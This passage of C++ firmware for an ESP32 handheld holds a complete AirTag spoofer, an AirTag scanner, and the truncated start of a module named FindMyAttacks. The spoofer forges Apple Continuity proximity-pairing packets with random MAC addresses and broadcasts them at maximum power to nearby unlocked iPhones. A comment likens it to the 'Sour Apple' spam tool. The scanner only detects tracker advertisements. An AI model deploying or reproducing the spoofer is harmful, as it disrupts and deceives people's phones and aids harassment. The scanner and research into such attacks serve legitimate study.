static constexpr int kAirTagModelCount = 2;

static int iconX[ICON_NUM] = {10};
static int iconY = STATUS_BAR_Y_OFFSET;
static bool s_uiDrawn = false;
static bool s_staticDrawn = false;
static bool s_running = false;
static bool s_advConfigured = false;
static unsigned long s_lastBtnMs = 0;
static unsigned long s_lastBurstMs = 0;
static unsigned long s_lastFieldMs = 0;
static unsigned long s_lastLogMs = 0;
static uint32_t s_txCount = 0;
static int s_modelIndex = 0;

static uint8_t s_mac[6];
static uint8_t s_packet[31];

static BLEAdvertising* s_advertising = nullptr;
static const char* s_advUuid = "00003082-0000-1000-9000-00805f9b34fb";

static char s_log[MAX_LOG][LOG_LINE_LEN];
static uint16_t s_logColor[MAX_LOG];
static int s_logCount = 0;
static char s_dispLog[MAX_LOG][LOG_LINE_LEN];
static uint16_t s_dispColor[MAX_LOG];
static int s_dispCount = 0;

static char s_cacheModel[16] = {0};
static char s_cacheMac[24] = {0};
static char s_cacheTx[16] = {0};
static char s_cacheHint[40] = {0};

static int rowY(int row) {
  return INFO_Y + 4 + row * ROW_H;
}

static int logBottomY() {
  // Leave a 2px gap above the touch nav bar.
  return bleContentBottom() - 2;
}

static int logVisibleLines() {
  const int h = logBottomY() - LOG_Y;
  if (h < LINE_H) {
    return 1;
  }
  int n = h / LINE_H;
  if (n > MAX_LOG) {
    n = MAX_LOG;
  }
  return n;
}

static void updateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  setTouchNavLabels(s_running ? "Stop" : "Start",
                    "Model",
                    "Exit",
                    nullptr,
                    nullptr);
  redrawTouchButtonBar();
}

static const char* modelName(int idx) {
  switch (kAirTagModels[idx % kAirTagModelCount]) {
    case 0x0055: return "AirTag";
    case 0x0030: return "AirTag Alt";
    default: return "AirTag";
  }
}

static void buildProximityPacket() {
  const uint16_t model = kAirTagModels[s_modelIndex % kAirTagModelCount];
  int i = 0;
  s_packet[i++] = 0x1e;
  s_packet[i++] = 0xff;
  s_packet[i++] = 0x4c;
  s_packet[i++] = 0x00;
  s_packet[i++] = 0x07;
  s_packet[i++] = 0x19;
  s_packet[i++] = 0x05;
  s_packet[i++] = (uint8_t)((model >> 8) & 0xFF);
  s_packet[i++] = (uint8_t)(model & 0xFF);
  s_packet[i++] = 0x55;
  s_packet[i++] = (uint8_t)(((random(10)) << 4) | (random(10)));
  s_packet[i++] = (uint8_t)(((random(8)) << 4) | (random(10)));
  s_packet[i++] = (uint8_t)random(256);
  s_packet[i++] = 0x00;
  s_packet[i++] = 0x00;
  esp_fill_random(&s_packet[i], 16);
  i += 16;
  while (i < 31) {
    s_packet[i++] = 0x00;
  }

  for (int b = 0; b < 6; b++) {
    s_mac[b] = (uint8_t)random(256);
  }
  s_mac[0] |= 0xC0;
}

static void paintField(int x, int y, int w, char* cache, size_t cacheSz,
                       const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return;
  }

  tft.setTextSize(1);
  int clearW = w;
  if (cache && cache[0]) {
    const int oldW = tft.textWidth(cache) + 2;
    const int newW = text[0] ? (tft.textWidth(text) + 2) : 0;
    clearW = oldW > newW ? oldW : newW;
    if (clearW > w) {
      clearW = w;
    }
  }
  tft.fillRect(x, y, clearW, FIELD_H, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(x, y);
  tft.print(text);

  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
}

static void paintFieldRight(int y, int rightMargin, char* cache, size_t cacheSz,
                            const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return;
  }

  tft.setTextSize(1);
  const int newW = text[0] ? tft.textWidth(text) : 0;
  const int oldW = (cache && cache[0]) ? tft.textWidth(cache) : 0;
  const int useW = oldW > newW ? oldW : newW;
  const int clearW = useW + 2;
  tft.fillRect(SCREEN_WIDTH - rightMargin - clearW, y, clearW, FIELD_H, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(SCREEN_WIDTH - rightMargin - newW, y);
  tft.print(text);
  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
}

static void drawStaticChrome() {
  if (s_staticDrawn) {
    return;
  }
  s_staticDrawn = true;

  tft.setTextSize(1);
  tft.setTextColor(ORANGE, TFT_BLACK);
  tft.setCursor(COL_LABEL_X, rowY(0));
  tft.print("MODEL");
  tft.setCursor(COL_LABEL_X, rowY(1));
  tft.print("MAC");
  tft.setCursor(COL_LABEL_X, rowY(2));
  tft.print("PROTO");

  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setCursor(COL_VALUE_X, rowY(2));
  tft.print("Continuity 0x07");

  tft.fillRect(0, LOG_HDR_Y, SCREEN_WIDTH, LOG_Y - LOG_HDR_Y, TFT_BLACK);
  tft.setTextColor(ORANGE, TFT_BLACK);
  tft.setCursor(COL_LABEL_X, LOG_HDR_Y + 2);
  tft.print("ACTIVITY");
  const int ruleX = COL_LABEL_X + tft.textWidth("ACTIVITY") + 8;
  tft.drawFastHLine(ruleX, LOG_HDR_Y + 6, SCREEN_WIDTH - COL_RIGHT_MARGIN - ruleX, UI_LINE);
}

static void updateInfoFields(bool force) {
  drawStaticChrome();

  if (force) {
    s_cacheModel[0] = '\0';
    s_cacheMac[0] = '\0';
    s_cacheTx[0] = '\0';
    s_cacheHint[0] = '\0';
  }

  char mac[24];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           s_mac[0], s_mac[1], s_mac[2], s_mac[3], s_mac[4], s_mac[5]);
  char tx[16];
  snprintf(tx, sizeof(tx), "TX %lu", (unsigned long)s_txCount);
  const char* hint = s_running ? "Unlock iPhone, stay nearby" : "Press Start to begin";

  paintField(COL_VALUE_X, rowY(0), COL_VALUE_W, s_cacheModel, sizeof(s_cacheModel),
             modelName(s_modelIndex), WHITE);
  paintFieldRight(rowY(0), COL_RIGHT_MARGIN, s_cacheTx, sizeof(s_cacheTx), tx, UI_DIM_TEXT);
  paintField(COL_VALUE_X, rowY(1), COL_VALUE_W + 40, s_cacheMac, sizeof(s_cacheMac), mac, WHITE);
  paintField(COL_LABEL_X, rowY(3), SCREEN_WIDTH - 20, s_cacheHint, sizeof(s_cacheHint),
             hint, UI_DIM_TEXT);
}

static void paintLogSlot(int index, const char* text, uint16_t color) {
  const int cap = logVisibleLines();
  const int bottom = logBottomY();
  if (index < 0 || index >= cap) {
    return;
  }
  if (!text) {
    text = "";
  }

  const int y = LOG_Y + index * LINE_H;
  if (y + LINE_H > bottom) {
    return;
  }

  // Only repaint when the on-screen slot actually changes.
  if (strcmp(s_dispLog[index], text) == 0 && s_dispColor[index] == color) {
    return;
  }

  tft.setTextSize(1);
  tft.fillRect(0, y, SCREEN_WIDTH, LINE_H, TFT_BLACK);
  if (text[0]) {
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(COL_LABEL_X, y);
    tft.print(text);
  }

  strncpy(s_dispLog[index], text, LOG_LINE_LEN - 1);
  s_dispLog[index][LOG_LINE_LEN - 1] = '\0';
  s_dispColor[index] = color;
}

static void syncLogDisplay() {
  const int cap = logVisibleLines();
  for (int i = 0; i < cap; i++) {
    if (i < s_logCount) {
      paintLogSlot(i, s_log[i], s_logColor[i]);
    } else if (s_dispLog[i][0]) {
      paintLogSlot(i, "", TFT_BLACK);
    }
  }
  s_dispCount = s_logCount;
}

static void logLine(const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  const int cap = logVisibleLines();
  const bool scrolled = (s_logCount >= cap);

  if (scrolled) {
    for (int i = 0; i < cap - 1; i++) {
      memcpy(s_log[i], s_log[i + 1], LOG_LINE_LEN);
      s_logColor[i] = s_logColor[i + 1];
    }
    s_logCount = cap - 1;
  }

  strncpy(s_log[s_logCount], text, LOG_LINE_LEN - 1);
  s_log[s_logCount][LOG_LINE_LEN - 1] = '\0';
  s_logColor[s_logCount] = color;
  const int lineIdx = s_logCount;
  s_logCount++;

  if (scrolled) {
    // Shifted lines: update each dirty slot only (no full-zone wipe).
    syncLogDisplay();
    return;
  }

  paintLogSlot(lineIdx, s_log[lineIdx], color);
  s_dispCount = s_logCount;
}

static void ensureAdvertising() {
  if (!s_advertising) {
    ensureBleStackReady();
    BLEServer* server = BLEDevice::createServer();
    s_advertising = server->getAdvertising();
    s_advConfigured = false;
  }
}

static void burstOnce(bool forceLog) {
  ensureAdvertising();
  buildProximityPacket();

  BLEAdvertisementData advData;
  advData.addData(std::string(reinterpret_cast<char*>(s_packet), 31));

  // Match Sour Apple: update payload + start, do not stop/restart each burst
  // (repeated stop/start + addServiceUUID was resetting the ESP32).
  if (!s_advConfigured) {
    s_advertising->addServiceUUID(s_advUuid);
    s_advertising->setMinInterval(0x20);
    s_advertising->setMaxInterval(0x20);
    s_advertising->setMinPreferred(0x20);
    s_advertising->setMaxPreferred(0x20);
    s_advConfigured = true;
  }
  s_advertising->setAdvertisementData(advData);
  s_advertising->start();

  s_txCount++;
  s_lastBurstMs = millis();

  const unsigned long now = millis();
  if (now - s_lastFieldMs >= UI_FIELD_MS) {
    s_lastFieldMs = now;
    updateInfoFields(false);
  }

  if (forceLog || (now - s_lastLogMs >= LOG_INTERVAL_MS)) {
    s_lastLogMs = now;
    char line[LOG_LINE_LEN];
    snprintf(line, sizeof(line), "[+] %s  %02X:%02X:%02X  #%lu",
             modelName(s_modelIndex), s_mac[0], s_mac[1], s_mac[2],
             (unsigned long)s_txCount);
    logLine(line, ORANGE);
  }
}

static void stopAdvertising() {
  if (s_advertising) {
    s_advertising->stop();
  }
  s_running = false;
  updateInfoFields(true);
  updateNavLabels();
  logLine("[*] Stopped", UI_DIM_TEXT);
}

static void startAdvertising() {
  ensureAdvertising();
  s_running = true;
  s_lastFieldMs = 0;
  s_lastLogMs = 0;
  updateInfoFields(true);
  updateNavLabels();
  logLine("[+] AirTag Continuity live", ORANGE);
  burstOnce(true);
}

static void runUI() {
  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_go_back};

  if (!s_uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        drawToolbarIcon(iconX[i], iconY, icons[i], ORANGE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    s_uiDrawn = true;
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (toolbarIconHitY(y, iconY)) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (toolbarIconHitX(x, iconX[i])) {
            feature_exit_requested = true;
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

static void handleButtons() {
  const unsigned long now = millis();
  if (now - s_lastBtnMs < BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    if (s_running) {
      stopAdvertising();
    } else {
      startAdvertising();
    }
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_DOWN)) {
    s_modelIndex = (s_modelIndex + 1) % kAirTagModelCount;
    updateInfoFields(true);
    updateNavLabels();
    char line[36];
    snprintf(line, sizeof(line), "[*] Model -> %s", modelName(s_modelIndex));
    logLine(line, ORANGE);
    s_lastBtnMs = now;
    return;
  }
}

static void teardown() {
  if (s_advertising) {
    s_advertising->stop();
  }
  s_running = false;
  s_advConfigured = false;
  s_advertising = nullptr;
}

void airTagSetup() {
  if (!bleRequireStackOrExit()) return;
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleClearBody(TFT_BLACK);

  setupTouchscreen();
  s_uiDrawn = false;
  s_staticDrawn = false;
  s_running = false;
  s_advConfigured = false;
  s_txCount = 0;
  s_logCount = 0;
  s_dispCount = 0;
  s_advertising = nullptr;
  s_lastBtnMs = 0;
  s_lastBurstMs = 0;
  s_lastFieldMs = 0;
  s_lastLogMs = 0;
  s_modelIndex = 0;
  s_cacheModel[0] = '\0';
  s_cacheMac[0] = '\0';
  s_cacheTx[0] = '\0';
  s_cacheHint[0] = '\0';
  memset(s_log, 0, sizeof(s_log));
  memset(s_dispLog, 0, sizeof(s_dispLog));
  memset(s_dispColor, 0, sizeof(s_dispColor));

  randomSeed(esp_random());
  buildProximityPacket();

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();
  runUI();
  updateNavLabels();

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

  updateInfoFields(true);
  logLine("[*] Ready", ORANGE);
  logLine("[*] Unlock iPhone, then Start", UI_DIM_TEXT);
}

void airTagLoop() {
  if (feature_exit_requested) {
    teardown();
    return;
  }
  if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    teardown();
    feature_exit_requested = true;
    return;
  }

  handleButtons();
  runUI();
  updateStatusBar();
  maintainTouchNavBar();

  if (s_running) {
    const unsigned long now = millis();
    if (now - s_lastBurstMs >= BURST_INTERVAL_MS) {
      burstOnce(false);
    }
  }

  if (feature_exit_requested) {
    teardown();
  }
}

void exit() {
  teardown();
}

}  // namespace AirTagSpoofer


namespace AirTagSniffer {

#define SCREEN_WIDTH 240
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 20
#define ICON_SIZE 16
#define ICON_NUM 1

static constexpr int HDR_Y = 42;
static constexpr int COL_Y = 58;
static constexpr int LIST_Y = 74;
static constexpr int ROW_H = 18;
static constexpr int MAX_HITS = 32;
static constexpr unsigned long BTN_DEBOUNCE_MS = 220;
static constexpr unsigned long UI_MS = 250;
static constexpr int LINE_LEN = 36;

enum HitKind : uint8_t {
  HIT_FIND_MY = 0,  // Apple Offline Finding 0x12
  HIT_NEW_AT = 1,   // Continuity 0x07 prefix 0x05 (New AirTag)
};

struct Hit {
  uint8_t mac[6];
  int8_t rssi;
  uint8_t kind;
  uint8_t status;
  uint16_t hits;
  uint32_t lastSeen;
  bool dirty;
};

static int iconX[ICON_NUM] = {10};
static int iconY = STATUS_BAR_Y_OFFSET;
static bool s_uiDrawn = false;
static bool s_chromeDrawn = false;
static bool s_scanning = false;
static bool s_listDirty = true;
static unsigned long s_lastBtnMs = 0;
static unsigned long s_lastUiMs = 0;

static Hit s_hits[MAX_HITS];
static int s_hitCount = 0;
static int s_selected = 0;
static int s_page = 0;

static BLEScan* s_scan = nullptr;
static portMUX_TYPE s_mux = portMUX_INITIALIZER_UNLOCKED;
static volatile bool s_hasUpdates = false;

static char s_cacheFound[12] = {0};
static char s_cacheState[10] = {0};

static int listBottomY() {
  return bleContentBottom() - 2;
}

static int rowsPerPage() {
  const int h = listBottomY() - LIST_Y;
  if (h < ROW_H) {
    return 1;
  }
  return h / ROW_H;
}

static const char* kindLabel(uint8_t kind) {
  switch (kind) {
    case HIT_FIND_MY: return "FindMy";
    case HIT_NEW_AT:  return "NewAT";
    default:          return "Apple";
  }
}

static void updateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  setTouchNavLabels(s_scanning ? "Stop" : "Start",
                    "Clear",
                    "Exit",
                    "Prev",
                    "Next");
  redrawTouchButtonBar();
}

static void paintField(int x, int y, int w, char* cache, size_t cacheSz,
                       const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return;
  }
  tft.setTextSize(1);
  int clearW = w;
  if (cache && cache[0]) {
    const int oldW = tft.textWidth(cache) + 2;
    const int newW = text[0] ? (tft.textWidth(text) + 2) : 0;
    clearW = oldW > newW ? oldW : newW;
    if (clearW > w) {
      clearW = w;
    }
  }
  tft.fillRect(x, y, clearW, 10, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(x, y);
  tft.print(text);
  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
}

static void drawChrome() {
  if (s_chromeDrawn) {
    return;
  }
  s_chromeDrawn = true;

  tft.setTextSize(1);
  tft.setTextColor(ORANGE, TFT_BLACK);
  tft.setCursor(10, COL_Y);
  tft.print("TYPE");
  tft.setCursor(58, COL_Y);
  tft.print("MAC");
  tft.setCursor(200, COL_Y);
  tft.print("RSSI");
  tft.drawFastHLine(10, COL_Y + 12, SCREEN_WIDTH - 20, UI_LINE);
}

static void updateHeader(bool force) {
  drawChrome();
  if (force) {
    s_cacheFound[0] = '\0';
    s_cacheState[0] = '\0';
  }
  char found[12];
  snprintf(found, sizeof(found), "FOUND %d", s_hitCount);
  paintField(10, HDR_Y, 90, s_cacheFound, sizeof(s_cacheFound), found, WHITE);
  paintField(200, HDR_Y, 40, s_cacheState, sizeof(s_cacheState),
             s_scanning ? "LIVE" : "IDLE",
             s_scanning ? ORANGE : UI_DIM_TEXT);
}

static void formatRow(const Hit& h, char* out, size_t outSz) {
  snprintf(out, outSz, "%-6s %02X:%02X:%02X:%02X:%02X:%02X %4d",
           kindLabel(h.kind),
           h.mac[0], h.mac[1], h.mac[2], h.mac[3], h.mac[4], h.mac[5],
           (int)h.rssi);
}

static void paintRow(int listIndex, bool selected) {
  const int per = rowsPerPage();
  if (listIndex < 0 || listIndex >= per) {
    return;
  }
  const int absIndex = s_page * per + listIndex;
  const int y = LIST_Y + listIndex * ROW_H;
  if (y + ROW_H > listBottomY()) {
    return;
  }

  tft.fillRect(0, y, SCREEN_WIDTH, ROW_H, TFT_BLACK);

  if (absIndex >= s_hitCount) {
    return;
  }

  char line[LINE_LEN];
  formatRow(s_hits[absIndex], line, sizeof(line));

  const uint16_t color = selected ? ORANGE : WHITE;
  tft.setTextSize(1);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(10, y + 4);
  tft.print(line);
  if (selected) {
    tft.fillRect(2, y + 2, 3, ROW_H - 4, ORANGE);
  }
}

static void redrawList() {
  const int per = rowsPerPage();
  const int start = s_page * per;

  if (s_hitCount <= 0) {
    const int h = listBottomY() - LIST_Y;
    if (h > 0) {
      tft.fillRect(0, LIST_Y, SCREEN_WIDTH, h, TFT_BLACK);
    }
    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.setCursor(10, LIST_Y + 8);
    tft.print(s_scanning ? "Listening for AirTags..." : "Press Start to scan");
    s_listDirty = false;
    return;
  }

  for (int i = 0; i < per; i++) {
    const int absIndex = start + i;
    paintRow(i, absIndex == s_selected);
  }
  s_listDirty = false;
  for (int i = 0; i < s_hitCount; i++) {
    s_hits[i].dirty = false;
  }
}

static void refreshDirtyRows() {
  const int per = rowsPerPage();
  const int start = s_page * per;
  const int end = start + per;
  bool any = s_listDirty;
  for (int i = start; i < end && i < s_hitCount; i++) {
    if (s_hits[i].dirty) {
      any = true;
      break;
    }
  }
  if (!any) {
    return;
  }
  for (int i = 0; i < per; i++) {
    const int absIndex = start + i;
    if (absIndex < s_hitCount && (s_listDirty || s_hits[absIndex].dirty)) {
      paintRow(i, absIndex == s_selected);
      if (absIndex < s_hitCount) {
        s_hits[absIndex].dirty = false;
      }
    } else if (s_listDirty && absIndex >= s_hitCount) {
      paintRow(i, false);
    }
  }
  s_listDirty = false;
}

static int findHitIndex(const uint8_t mac[6]) {
  for (int i = 0; i < s_hitCount; i++) {
    if (memcmp(s_hits[i].mac, mac, 6) == 0) {
      return i;
    }
  }
  return -1;
}

static void upsertHit(const uint8_t mac[6], int8_t rssi, uint8_t kind, uint8_t status) {
  const int idx = findHitIndex(mac);
  if (idx >= 0) {
    Hit& h = s_hits[idx];
    if (h.rssi != rssi || h.status != status || h.kind != kind) {
      h.dirty = true;
    }
    h.rssi = rssi;
    h.kind = kind;
    h.status = status;
    h.hits++;
    h.lastSeen = millis();
    return;
  }
  if (s_hitCount >= MAX_HITS) {
    // Drop weakest RSSI to make room.
    int weakest = 0;
    for (int i = 1; i < s_hitCount; i++) {
      if (s_hits[i].rssi < s_hits[weakest].rssi) {
        weakest = i;
      }
    }
    if (rssi < s_hits[weakest].rssi) {
      return;
    }
    memmove(&s_hits[weakest], &s_hits[weakest + 1],
            (size_t)(s_hitCount - weakest - 1) * sizeof(Hit));
    s_hitCount--;
    s_listDirty = true;
  }

  Hit& h = s_hits[s_hitCount++];
  memcpy(h.mac, mac, 6);
  h.rssi = rssi;
  h.kind = kind;
  h.status = status;
  h.hits = 1;
  h.lastSeen = millis();
  h.dirty = true;
  s_listDirty = true;
}

static bool parseAppleAdv(const uint8_t* data, size_t len,
                          uint8_t* kindOut, uint8_t* statusOut) {
  if (!data || len < 4) {
    return false;
  }
  // NimBLE manufacturer data: company ID LE + payload.
  if (data[0] != 0x4C || data[1] != 0x00) {
    return false;
  }
  const uint8_t appleType = data[2];
  if (appleType == 0x12) {
    *kindOut = HIT_FIND_MY;
    *statusOut = (len > 4) ? data[4] : 0;
    return true;
  }
  // Continuity Proximity Pairing â€” New AirTag prefix 0x05.
  if (appleType == 0x07 && len >= 5 && data[4] == 0x05) {
    *kindOut = HIT_NEW_AT;
    *statusOut = data[4];
    return true;
  }
  return false;
}

class AdvCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice* device) override {
    if (!s_scanning || !device || !device->haveManufacturerData()) {
      return;
    }
    const std::string md = device->getManufacturerData();
    uint8_t kind = 0;
    uint8_t status = 0;
    if (!parseAppleAdv(reinterpret_cast<const uint8_t*>(md.data()), md.size(),
                       &kind, &status)) {
      return;
    }

    const std::string addrStr = device->getAddress().toString();
    unsigned int b0 = 0, b1 = 0, b2 = 0, b3 = 0, b4 = 0, b5 = 0;
    if (sscanf(addrStr.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
               &b0, &b1, &b2, &b3, &b4, &b5) != 6) {
      return;
    }
    const uint8_t mac[6] = {
      (uint8_t)b0, (uint8_t)b1, (uint8_t)b2,
      (uint8_t)b3, (uint8_t)b4, (uint8_t)b5
    };

    const int8_t rssi = (int8_t)device->getRSSI();

    portENTER_CRITICAL(&s_mux);
    upsertHit(mac, rssi, kind, status);
    s_hasUpdates = true;
    portEXIT_CRITICAL(&s_mux);
  }
};

static AdvCallbacks s_callbacks;

static void stopScan() {
  if (s_scan) {
    s_scan->stop();
    s_scan->setAdvertisedDeviceCallbacks(nullptr);
  }
  s_scanning = false;
}

static void startScan() {
  if (!s_scan) {
    ensureBleStackReady();
    s_scan = BLEDevice::getScan();
  }
  s_scan->stop();
  s_scan->setAdvertisedDeviceCallbacks(&s_callbacks, true);
  s_scan->setActiveScan(true);
  s_scan->setInterval(80);
  s_scan->setWindow(60);
  s_scan->setDuplicateFilter(false);
  s_scanning = true;
  // Non-blocking continuous scan. start(0, false) is the BLOCKING overload
  // and hangs forever with duration 0.
  s_scan->start(0, nullptr, false);
}

static void clearHits() {
  portENTER_CRITICAL(&s_mux);
  s_hitCount = 0;
  s_selected = 0;
  s_page = 0;
  s_listDirty = true;
  s_hasUpdates = true;
  portEXIT_CRITICAL(&s_mux);
}

static void clampSelection() {
  const int per = rowsPerPage();
  if (s_hitCount <= 0) {
    s_selected = 0;
    s_page = 0;
    return;
  }
  if (s_selected >= s_hitCount) {
    s_selected = s_hitCount - 1;
  }
  if (s_selected < 0) {
    s_selected = 0;
  }
  s_page = s_selected / per;
}

static void handleButtons() {
  const unsigned long now = millis();
  if (now - s_lastBtnMs < BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    if (s_scanning) {
      stopScan();
    } else {
      startScan();
    }
    updateHeader(true);
    updateNavLabels();
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_DOWN)) {
    clearHits();
    updateHeader(true);
    redrawList();
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_UP)) {
    if (s_hitCount <= 0) {
      return;
    }
    const int prev = s_selected;
    s_selected = (s_selected <= 0) ? (s_hitCount - 1) : (s_selected - 1);
    clampSelection();
    if (s_selected / rowsPerPage() != prev / rowsPerPage()) {
      s_listDirty = true;
      redrawList();
    } else {
      const int per = rowsPerPage();
      paintRow(prev % per, false);
      paintRow(s_selected % per, true);
    }
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_RIGHT)) {
    if (s_hitCount <= 0) {
      return;
    }
    const int prev = s_selected;
    s_selected = (s_selected + 1) % s_hitCount;
    clampSelection();
    if (s_selected / rowsPerPage() != prev / rowsPerPage()) {
      s_listDirty = true;
      redrawList();
    } else {
      const int per = rowsPerPage();
      paintRow(prev % per, false);
      paintRow(s_selected % per, true);
    }
    s_lastBtnMs = now;
    return;
  }
}

static void runUI() {
  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_go_back};
  if (!s_uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i]) {
        drawToolbarIcon(iconX[i], iconY, icons[i], ORANGE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    s_uiDrawn = true;
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (toolbarIconHitY(y, iconY)) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (toolbarIconHitX(x, iconX[i])) {
            feature_exit_requested = true;
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

static void teardown() {
  stopScan();
  s_scan = nullptr;
}

void airTagSnifferSetup() {
  if (!bleRequireStackOrExit()) return;
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleClearBody(TFT_BLACK);
  setupTouchscreen();

  s_uiDrawn = false;
  s_chromeDrawn = false;
  s_scanning = false;
  s_listDirty = true;
  s_hitCount = 0;
  s_selected = 0;
  s_page = 0;
  s_hasUpdates = false;
  s_lastBtnMs = 0;
  s_lastUiMs = 0;
  s_cacheFound[0] = '\0';
  s_cacheState[0] = '\0';
  s_scan = nullptr;

  // Stop any other BLE scan that may be holding the radio.
  {
    BLEScan* existing = BLEDevice::getScan();
    if (existing) {
      existing->stop();
    }
  }

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();
  runUI();
  updateNavLabels();
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  updateHeader(true);
  redrawList();

  // Auto-start so the feature is immediately useful.
  startScan();
  updateHeader(true);
  updateNavLabels();
}

void airTagSnifferLoop() {
  if (feature_exit_requested) {
    teardown();
    return;
  }
  if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    teardown();
    feature_exit_requested = true;
    return;
  }

  handleButtons();
  runUI();
  updateStatusBar();
  maintainTouchNavBar();

  const unsigned long now = millis();
  if (s_hasUpdates || (now - s_lastUiMs >= UI_MS)) {
    s_lastUiMs = now;
    bool updates = false;
    portENTER_CRITICAL(&s_mux);
    updates = s_hasUpdates;
    s_hasUpdates = false;
    portEXIT_CRITICAL(&s_mux);

    if (updates || s_listDirty) {
      clampSelection();
      updateHeader(false);
      if (s_listDirty) {
        redrawList();
      } else {
        refreshDirtyRows();
      }
    }
  }

  // Keep continuous scan alive if NimBLE stopped it.
  if (s_scanning && s_scan && !s_scan->isScanning()) {
    s_scan->start(0, nullptr, false);
  }

  static uint32_t s_lastLedMs = 0;
  if ((uint32_t)(now - s_lastLedMs) >= 200u) {
    if (s_scanning) {
      static uint8_t sweep = 0;
      sweep = (uint8_t)((sweep + 14) % 101);
      neopixelShowProgressColor(sweep, 0, 200, 255);
    } else {
      neopixelShowProgressColor(
          (uint8_t)constrain(s_hitCount * 100 / 12, 0, 100), 0, 200, 255);
    }
    s_lastLedMs = now;
  }

  if (feature_exit_requested) {
    teardown();
  }
}

void exit() {
  teardown();
}

}  // namespace AirTagSniffer


namespace FindMyAttacks {

enum TrackerProfile : uint8_t {
  PROFILE_AIRTAG = 0,
  PROFILE_FMNA = 1,
  PROFILE_DULT = 2
};

struct Target {
  char address[18];
  uint8_t addressType;
  int8_t rssi;
  uint8_t profile;
  bool connectable;
  uint16_t hits;
  uint32_t lastSeen;
};

static constexpr uint8_t kMaxTargets = 24;
static constexpr uint32_t kUiPeriodMs = 250;
static constexpr uint32_t kButtonDebounceMs = 220;
static Target s_targets[kMaxTargets];
static uint8_t s_targetCount = 0;
static uint8_t s_selected = 0;
static bool s_scanning = false;
static bool s_soundMode = false;
static bool s_dirty = true;
static uint32_t s_lastUiMs = 0;
static uint32_t s_lastButtonMs = 0;
static BLEScan* s_scan = nullptr;
static portMUX_TYPE s_mux = portMUX_INITIALIZER_UNLOCKED;
static char s_result[48] = "Ready - scan for a target";

static const BLEUUID& airTagService() {
  static const BLEUUID uuid("7dfc9000-7d1c-4951-86aa-8d9728f8d66c");
  return uuid;
